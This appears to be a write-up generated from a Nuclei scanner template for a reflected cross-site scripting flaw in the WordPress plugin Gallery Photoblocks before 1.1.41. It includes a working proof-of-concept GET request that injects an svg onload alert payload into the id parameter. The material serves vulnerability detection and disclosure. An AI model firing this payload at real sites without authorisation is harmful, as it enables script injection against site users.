# Nuclei Template: Gallery Photoblocks < 1.1.41 - Cross-Site Scripting
**Template ID:** photoblocks-grid-gallery-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** Medium
**CWE:** CWE-79
**Source:** Nuclei Template (`photoblocks-grid-gallery-xss.yaml`)

## Vulnerability Information & PoC

## Description
Reflected Cross-Site Scripting (XSS) is a type of web vulnerability where an attacker injects malicious scripts into a website, and the injected code gets reflected back to the user's browser, executing the script in the context of the vulnerable website.

## Steps to reproduce / Exploit Payload
```http
GET /wp-content/plugins/photoblocks-grid-gallery/admin/partials/photoblocks-edit.php?id=%22%3E%3Csvg/onload=alert(document.domain)%3E HTTP/1.1
Host: {{Hostname}}
```

## Remediation
Fixed in version 1.1.41

## References
- https://plugins.trac.wordpress.org/changeset/2117972
- https://wpscan.com/vulnerability/5c57e78a-97b9-4e23-8935-e4c9d806c89d
- https://wordpress.org/plugins/photoblocks-grid-gallery/
